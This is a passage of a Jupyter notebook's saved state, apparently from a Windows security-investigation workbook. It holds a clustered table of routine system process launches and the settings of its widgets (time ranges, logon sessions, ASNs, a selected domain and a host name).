-StartupEvent 720 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22293</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent 754 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22294</th>\n      <td>C:\\Windows\\Temp\\4B2096BE-60E3-4625-8BB2-4B029D427DF0\\DismHost.exe</td>\n      <td>C:\\Windows\\TEMP\\4B2096BE-60E3-4625-8BB2-4B029D427DF0\\dismhost.exe {45426DF1-4414-4BAF-ABDE-80820...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22295</th>\n      <td>C:\\Windows\\SoftwareDistribution\\Download\\Install\\Windows-KB890830-x64-V5.69-delta.exe</td>\n      <td>\"C:\\Windows\\SoftwareDistribution\\Download\\Install\\Windows-KB890830-x64-V5.69-delta.exe\" /Q /W</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22296</th>\n      <td>C:\\Windows\\System32\\MRT.exe</td>\n      <td>\"C:\\Windows\\system32\\MRT.exe\" /Q /W</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22297</th>\n      <td>C:\\Windows\\System32\\taskhostw.exe</td>\n      <td>taskhostw.exe /RuntimeWide</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22298</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Ngen.exe  Update /Queue /Delay</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22299</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Ngen.exe  Update /Queue /Delay</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22300</th>\n      <td>C:\\Windows\\Temp\\6EC75DE4-F841-4D83-9C3B-2BFCED9077A9\\DismHost.exe</td>\n      <td>C:\\Windows\\TEMP\\6EC75DE4-F841-4D83-9C3B-2BFCED9077A9\\dismhost.exe {7BC20EF7-0FEF-456A-A9C0-22BE9...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22301</th>\n      <td>C:\\Windows\\SoftwareDistribution\\Download\\Install\\AM_Delta_Patch_1.285.1510.0.exe</td>\n      <td>\"C:\\Windows\\SoftwareDistribution\\Download\\Install\\AM_Delta_Patch_1.285.1510.0.exe\" WD /q</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22302</th>\n      <td>C:\\Windows\\System32\\MpSigStub.exe</td>\n      <td>C:\\Windows\\system32\\MpSigStub.exe /stub 1.1.15500.2 /payload 1.285.1546.0 /MpWUStub /program C:\\...</td>\n      <td>0x3e7</td>\n      <td>3</td>\n    </tr>\n    <tr>\n      <th>22303</th>\n      <td>C:\\Windows\\System32\\MpSigStub.exe</td>\n      <td>C:\\Windows\\system32\\MpSigStub.exe /stub 1.1.15500.2 /payload 1.285.1510.0 /MpWUStub /program C:\\...</td>\n      <td>0x3e7</td>\n      <td>3</td>\n    </tr>\n    <tr>\n      <th>22304</th>\n      <td>C:\\Windows\\System32\\MpSigStub.exe</td>\n      <td>C:\\Windows\\system32\\MpSigStub.exe /stub 1.1.15500.2 /payload 1.285.1451.0 /MpWUStub /program C:\\...</td>\n      <td>0x3e7</td>\n      <td>3</td>\n    </tr>\n    <tr>\n      <th>22305</th>\n      <td>C:\\Windows\\System32\\poqexec.exe</td>\n      <td>C:\\Windows\\System32\\poqexec.exe /noreboot /transaction 40016 /display_progress \\SystemRoot\\WinSx...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22306</th>\n      <td>C:\\Program Files (x86)\\Google\\Update\\Install\\{049CD3BD-D98E-4D19-9695-9DCDF6AF728C}\\72.0.3626.10...</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Update\\Install\\{049CD3BD-D98E-4D19-9695-9DCDF6AF728C}\\72.0.3626.1...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22307</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.96\\Installer\\setup.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.96\\Installer\\setup.exe\" --update-set...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22308</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.96\\Installer\\setup.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.96\\Installer\\setup.exe\" --type=crash...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22309</th>\n      <td>C:\\Windows\\Temp\\CR_42BC8.tmp\\setup.exe</td>\n      <td>\"C:\\Windows\\TEMP\\CR_42BC8.tmp\\setup.exe\" --install-archive=\"C:\\Windows\\TEMP\\CR_42BC8.tmp\\CHROME_...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22310</th>\n      <td>C:\\Windows\\Temp\\CR_42BC8.tmp\\setup.exe</td>\n      <td>C:\\Windows\\TEMP\\CR_42BC8.tmp\\setup.exe --type=crashpad-handler /prefetch:7 --monitor-self-annota...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22311</th>\n      <td>C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /ping PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZG...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22312</th>\n      <td>C:\\Windows\\SoftwareDistribution\\Download\\Install\\AM_Delta_Patch_1.285.1451.0.exe</td>\n      <td>\"C:\\Windows\\SoftwareDistribution\\Download\\Install\\AM_Delta_Patch_1.285.1451.0.exe\" WD /q</td>\n      <td>0x3e7</td>\n      <td>2</td>\n    </tr>\n    <tr>\n      <th>22313</th>\n      <td>C:\\Windows\\Temp\\4B7A5E8D-F799-4C9B-93C9-E14EE91DA56C\\DismHost.exe</td>\n      <td>C:\\Windows\\TEMP\\4B7A5E8D-F799-4C9B-93C9-E14EE91DA56C\\dismhost.exe {2E888E6E-757D-4C0D-9F95-21EF2...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22751</th>\n      <td>C:\\Windows\\System32\\Dism.exe</td>\n      <td>dism /online /enable-feature /featurename:File-Services /NoRestart</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22752</th>\n      <td>C:\\Windows\\Temp\\D398059B-A17E-43B8-95E4-8F0453629D9F\\DismHost.exe</td>\n      <td>C:\\Windows\\TEMP\\D398059B-A17E-43B8-95E4-8F0453629D9F\\dismhost.exe {5B5DC19A-0D8F-4B1F-8B28-CAE7B...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22754</th>\n      <td>C:\\Windows\\Temp\\51D810D9-D1BE-4313-9F48-716F3CDD5B37\\DismHost.exe</td>\n      <td>C:\\Windows\\TEMP\\51D810D9-D1BE-4313-9F48-716F3CDD5B37\\dismhost.exe {48529F4E-DF77-4A70-B40E-30D5F...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22756</th>\n      <td>C:\\Windows\\System32\\msiexec.exe</td>\n      <td>C:\\Windows\\system32\\msiexec.exe /V</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22757</th>\n      <td>C:\\Windows\\SysWOW64\\msiexec.exe</td>\n      <td>C:\\Windows\\syswow64\\MsiExec.exe -Embedding 772A9CF421EEC37E11490F01D0EDD091 C</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22759</th>\n      <td>C:\\Windows\\System32\\CompatTelRunner.exe</td>\n      <td>C:\\Windows\\system32\\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22761</th>\n      <td>C:\\Windows\\Temp\\48430F18-6BAA-4BC6-AF78-322BF2901457\\DismHost.exe</td>\n      <td>C:\\Windows\\TEMP\\48430F18-6BAA-4BC6-AF78-322BF2901457\\dismhost.exe {8115FCF2-695F-4085-9A50-AFFE3...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22763</th>\n      <td>C:\\Windows\\System32\\fontdrvhost.exe</td>\n      <td>\"fontdrvhost.exe\"</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22764</th>\n      <td>C:\\Windows\\System32\\rundll32.exe</td>\n      <td>C:\\Windows\\system32\\rundll32.exe Startupscan.dll,SusRunTask</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22765</th>\n      <td>C:\\Windows\\System32\\tzsync.exe</td>\n      <td>C:\\Windows\\system32\\tzsync.exe</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22766</th>\n      <td>C:\\Windows\\System32\\cleanmgr.exe</td>\n      <td>C:\\Windows\\system32\\cleanmgr.exe /autoclean /d C:</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22767</th>\n      <td>C:\\Windows\\System32\\sdiagnhost.exe</td>\n      <td>C:\\Windows\\System32\\sdiagnhost.exe -Embedding</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22769</th>\n      <td>C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe</td>\n      <td>\"C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe\" -stopPoll C:\\WindowsAzure\\Logs\\ 5248000</td>\n      <td>0x3e7</td>\n      <td>2</td>\n    </tr>\n    <tr>\n      <th>22786</th>\n      <td>C:\\Windows\\System32\\rundll32.exe</td>\n      <td>\"C:\\Windows\\system32\\RunDll32.exe\" C:\\Windows\\System32\\SHELL32.dll,RunAsNewUser_RunDLL Local\\{4d...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>22811</th>\n      <td>C:\\Windows\\Temp\\A0F31676-B6F4-4CE1-8B16-6950C968FAA7\\DismHost.exe</td>\n      <td>C:\\Windows\\TEMP\\A0F31676-B6F4-4CE1-8B16-6950C968FAA7\\dismhost.exe {724FCC4E-D40E-4FB9-9DA7-14411...</td>\n      <td>0x3e7</td>\n      <td>1</td>\n    </tr>\n  </tbody>\n</table>\n<p>1905 rows × 4 columns</p>\n</div>",
          "text/plain": "                                                                                            NewProcessName  \\\n0                          C:\\WindowsAzure\\GuestAgent_2.7.41491.901_2019-01-14_202614\\CollectGuestLogs.exe   \n40                         C:\\WindowsAzure\\GuestAgent_2.7.41491.901_2019-01-14_202614\\CollectGuestLogs.exe   \n128                                                                        C:\\Windows\\System32\\conhost.exe   \n5687   C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\ICT 2\\CMF\\DesiredStateCon...   \n10729                                                C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe   \n...                                                                                                    ...   \n22766                                                                     C:\\Windows\\System32\\cleanmgr.exe   \n22767                                                                   C:\\Windows\\System32\\sdiagnhost.exe   \n22769                                                          C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe   \n22786                                                                     C:\\Windows\\System32\\rundll32.exe   \n22811                                    C:\\Windows\\Temp\\A0F31676-B6F4-4CE1-8B16-6950C968FAA7\\DismHost.exe   \n\n                                                                                               CommandLine  \\\n0      \"CollectGuestLogs.exe\" -Mode:ga -FileName:C:\\WindowsAzure\\CollectGuestLogsTemp\\710dc858-9c96-4df...   \n40     \"CollectGuestLogs.exe\" -Mode:ga -FileName:C:\\WindowsAzure\\CollectGuestLogsTemp\\7a9d40f2-490e-446...   \n128                                                \\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1   \n5687   \"C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\ICT 2\\CMF/DesiredStateCo...   \n10729                 \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler   \n...                                                                                                    ...   \n22766                                                    C:\\Windows\\system32\\cleanmgr.exe /autoclean /d C:   \n22767                                                        C:\\Windows\\System32\\sdiagnhost.exe -Embedding   \n22769                \"C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe\" -stopPoll C:\\WindowsAzure\\Logs\\ 5248000   \n22786  \"C:\\Windows\\system32\\RunDll32.exe\" C:\\Windows\\System32\\SHELL32.dll,RunAsNewUser_RunDLL Local\\{4d...   \n22811  C:\\Windows\\TEMP\\A0F31676-B6F4-4CE1-8B16-6950C968FAA7\\dismhost.exe {724FCC4E-D40E-4FB9-9DA7-14411...   \n\n      SubjectLogonId  ClusterSize  \n0              0x3e7          128  \n40             0x3e7          128  \n128            0x3e7         5559  \n5687           0x3e7          162  \n10729          0x3e7          137  \n...              ...          ...  \n22766          0x3e7            1  \n22767          0x3e7            1  \n22769          0x3e7            2  \n22786          0x3e7            1  \n22811          0x3e7            1  \n\n[1905 rows x 4 columns]"
         },
         "metadata": {},
         "output_type": "display_data"
        }
       ]
      }
     },
     "cbc5a13b749c4dffb462ad816e358692": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "cc3e785ac6ef41debee641a88bbad8da": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_7729c284fdfd41b3870789550e0b5b46",
       "style": "IPY_MODEL_133361d329f044abb3a3abcab05c86eb",
       "value": "2019-02-13 19:04:00.244055"
      }
     },
     "cdd0c0089cc64e4e81c7ff7842acf225": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter:",
       "layout": "IPY_MODEL_1aeb363aed9e4a078b83fd38ba3ff9d6",
       "style": "IPY_MODEL_991db46ddd6e4b3bba9f9716bf7a2704"
      }
     },
     "d181ae50519d459a8677d7cefa540ac7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_792a0afe4cae4e38a9ff8a10af4f42e7",
       "style": "IPY_MODEL_28c114e2c203434fadaac68d323e92d1",
       "value": "2019-02-13 19:04:00.244055"
      }
     },
     "d2490aff09e44aaeb59457803f1ac7eb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "d3f174e10e2d482a96ec9386c94a8126": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter:",
       "layout": "IPY_MODEL_446cfff5dd724221a3e5761d82a26a92",
       "style": "IPY_MODEL_1ae179fd2f2c4440af77f076811fca57"
      }
     },
     "d5fcb03b243348c786f9d4f646341d71": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_9a90a1e9ebec43bda086520d352c1524",
       "style": "IPY_MODEL_d8713b30ed26462ba5f45d9dcca34416",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "d613c06f3eb84dc1924f7044c0cdf10d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "d74b516df5b348e48db5e65249d3bc18": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "1px solid black"
      }
     },
     "d8479599c033447e9e8a56749602b730": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_5d3542002e0a493c9326fb2d0266bf63",
        "IPY_MODEL_8a3157bd1dcb415f8dc43557aeab3c33"
       ],
       "layout": "IPY_MODEL_5cf70822dd3f4e58b3d45d7662e3fba6"
      }
     },
     "d8713b30ed26462ba5f45d9dcca34416": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "d95d0f4e03454766a113849ed1a46876": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter:",
       "layout": "IPY_MODEL_63fc703b33614525bba2293fffac6f2d",
       "style": "IPY_MODEL_f94ee97d79ee4fdd93dfce891fd8522b"
      }
     },
     "d9f389d015a84c7b9e30a0182368e5ab": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "dcac7a84f3554c558d3aebdfebaf835e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "dd2479761ed24cc69dabb38053f99511": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectMultipleModel",
      "state": {
       "_options_labels": [
        "BYTEMARK-AS, GB",
        "CENTURYLINK-US-LEGACY-QWEST - CenturyLink Communications, LLC, US",
        "JUMP, GB",
        "TELE2, SE"
       ],
       "description": "Selected: ",
       "index": [],
       "layout": "IPY_MODEL_fc3db55f546c40afa64d67b7360a6d02",
       "rows": 5,
       "style": "IPY_MODEL_1aa664f98c42423384c5a5c08c47f5a4"
      }
     },
     "dd6a9a470f2b440f956956be7833abab": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "layout": "IPY_MODEL_090a653be289451a8ac65e42a9b941d5",
       "max": 1,
       "min": -20,
       "style": "IPY_MODEL_f658f62f8f624c049e2c4c493c8bf650",
       "value": [
        -5,
        1
       ]
      }
     },
     "de9a4ecb8585451ba8ec871dce4de05c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "df41cb69cea249ac9fcbb0b590e83bb3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "Add ⇾",
       "layout": "IPY_MODEL_7fdab0e2480b460abe23517404343c48",
       "style": "IPY_MODEL_6b941172e6c84ea18d6aeffad725e63d"
      }
     },
     "e3577780a8134faf9511219791493a25": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectMultipleModel",
      "state": {
       "_options_labels": [
        "www.401hk.com"
       ],
       "description": "Selected: ",
       "index": [
        0
       ],
       "layout": "IPY_MODEL_192c9ef6fca64b9184c07e7f8fa1a52e",
       "rows": 5,
       "style": "IPY_MODEL_d2490aff09e44aaeb59457803f1ac7eb"
      }
     },
     "e52fc813d2f74c47b30b7aebca981895": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "e6aab38463c540a1abfe0aa8138c03fe": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "e735a36dabce41458313c7e526b7a5af": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "CheckboxModel",
      "state": {
       "description": "Center subsequent query times round selected Alert?",
       "disabled": false,
       "layout": "IPY_MODEL_faf8048b3b904576bcb815288a03c562",
       "style": "IPY_MODEL_30baa2c85bb64cf6a60e1e4e7c807d59",
       "value": true
      }
     },
     "e74808a8d33f444887f07fa8926bfaae": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "⇽ Remove",
       "layout": "IPY_MODEL_30bbda02b41b4a2ba49cc883d52185ab",
       "style": "IPY_MODEL_62232bd3259840378d11449515c56b6b"
      }
     },
     "e97b6518b3ed460eba8e55e58c27e42d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "⇽ Remove All",
       "layout": "IPY_MODEL_6a3605eba2ec4f6e9970489cce005248",
       "style": "IPY_MODEL_947daa33e9c345ac9308de41777c9b57"
      }
     },
     "ec0eab94d292422984ac46ff19c33f34": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "ec7550e3f51f4256bc1ceff5661d9ebb": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_d74b516df5b348e48db5e65249d3bc18"
      }
     },
     "ed1769e3307f458090aaab27e5450836": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "300px",
       "width": "95%"
      }
     },
     "ed98e6cc150540db8684fb76ba12357b": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "ee60d32c9ce348a9b683e095d2dee8cd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "f2150c20a2794e8bad6e6c2995318098": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "f40df6a3f0754fe8af2a97a4d8626a8a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "0x5d5af2  ian   Rarity=0.6071428571428571",
        "0xbd57571  MSTICAdmin   Rarity=0.48473512211902303",
        "0x109c408  MSTICAdmin   Rarity=0.4325490196078432",
        "0x2e2017  MSTICAdmin   Rarity=0.40823925529807875",
        "0x3e7  -   Rarity=0.35",
        "0x78225e  MSTICAdmin   Rarity=0.29777466542172426",
        "0xbed1e13  MSTICAdmin   Rarity=0.29777466542172426",
        "0x1e821b5  MSTICAdmin   Rarity=0.23999183006535948",
        "0xab5a5ac  MSTICAdmin   Rarity=0.23999183006535948",
        "0xc277459  MSTICAdmin   Rarity=0.2366557734204793",
        "0x1f388a3  MSTICAdmin   Rarity=0.20284780578898226",
        "0xc54c7b9  MSTICAdmin   Rarity=0.20284780578898226",
        "0x527d50d  MSTICAdmin   Rarity=0.0588235294117647",
        "0x3e5  LOCAL SERVICE   Rarity=0.03846153846153844",
        "0x3e7  MSTICAlertsWin1$   Rarity=0.01235976586997457",
        "0x3e4  MSTICAlertsWin1$   Rarity=0.004635842381359155"
       ],
       "description": "Select logon session to examine",
       "index": 1,
       "layout": "IPY_MODEL_c4af651261194be48080b1095dd612d8",
       "style": "IPY_MODEL_aca93f8ef4e04983ac164ae74396e846"
      }
     },
     "f41e95ac21954b58a3568b8734bfa3f9": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "80%"
      }
     },
     "f42232e38d9243cd9cdbafcefe5a9a62": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_69dafe7021ba41bab5239278d40a0f1d",
       "style": "IPY_MODEL_bb090c535e6c4dfabcb311e38afdde43",
       "value": {
        "date": 9,
        "month": 1,
        "year": 2019
       }
      }
     },
     "f658f62f8f624c049e2c4c493c8bf650": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "f75df425ed044a4585bbe7587d662984": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "f7a711dc6afe4c4f8c39334a586acc7c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "f7dc25a23f4448a594a7bd3e2bfcc2b8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_9ce8e91ad66e49f090fc3ac0e1bbe728",
       "style": "IPY_MODEL_3798c9cadbe84e8f8c7f705853c45957",
       "value": {
        "date": 18,
        "month": 1,
        "year": 2019
       }
      }
     },
     "f91d041e50034251988aeddb99ce9016": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "SYSTEM:    (logontype 5)   timerange: 2019-02-09 12:32:50.220000 - 2019-02-15 11:51:37.597000    count: 120",
        "MSTICAdmin:    (logontype 4)   timerange: 2019-02-09 23:26:47.700000 - 2019-02-14 11:51:37.603000    count: 8",
        "MSTICAdmin:    (logontype 3)   timerange: 2019-02-12 04:37:25.340000 - 2019-02-15 03:57:00.207000    count: 8",
        "SYSTEM:    (logontype 0)   timerange: 2019-02-12 04:40:03.870000 - 2019-02-14 04:20:54.370000    count: 2",
        "NETWORK SERVICE:    (logontype 5)   timerange: 2019-02-12 04:40:04.207000 - 2019-02-14 04:20:54.630000    count: 2",
        "DWM-1:    (logontype 2)   timerange: 2019-02-12 04:40:04.483000 - 2019-02-14 04:20:54.773000    count: 4",
        "LOCAL SERVICE:    (logontype 5)   timerange: 2019-02-12 04:40:04.573000 - 2019-02-14 04:20:54.803000    count: 2",
        "IUSR:    (logontype 5)   timerange: 2019-02-12 04:40:12.360000 - 2019-02-14 04:20:56.110000    count: 2",
        "DWM-2:    (logontype 2)   timerange: 2019-02-12 20:19:43.440000 - 2019-02-15 03:57:01.903000    count: 6",
        "MSTICAdmin:    (logontype 10)   timerange: 2019-02-12 20:19:44.767000 - 2019-02-15 03:57:02.593000    count: 2",
        "ian:    (logontype 2)   timerange: 2019-02-12 20:29:51.030000 - 2019-02-12 20:29:51.030000    count: 2",
        "ian:    (logontype 4)   timerange: 2019-02-12 20:41:17.310000 - 2019-02-12 20:41:17.310000    count: 1",
        "ian:    (logontype 3)   timerange: 2019-02-13 00:55:38.670000 - 2019-02-15 03:56:34.440000    count: 5"
       ],
       "description": "Select logon cluster to examine",
       "index": 12,
       "layout": "IPY_MODEL_07a5f823146d4732930c9b6a61cc1605",
       "style": "IPY_MODEL_29d6601088794722801b0f99645270c6"
      }
     },
     "f94ee97d79ee4fdd93dfce891fd8522b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "faf8048b3b904576bcb815288a03c562": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "95%"
      }
     },
     "faf921499b4e43cfb132bdb39ea59095": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "fb23d971449a4c12838b713304ecd568": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "fb5db673530541e39973351a79bedd5c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "fc1c25c052124d69a862037672bf3391": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "fc3db55f546c40afa64d67b7360a6d02": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "200px",
       "width": "40%"
      }
     },
     "fde88d4aafd64d3a8a1329eb822dc38e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Enter the Host name to search for:",
       "layout": "IPY_MODEL_faf8048b3b904576bcb815288a03c562",
       "style": "IPY_MODEL_bfdfaa5bef0b48e892e846a85ff8b777",
       "value": "MSTICAlertsWin1"
      }
     },
     "ff00f4ca894a495a8c6554ff6e267f78": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
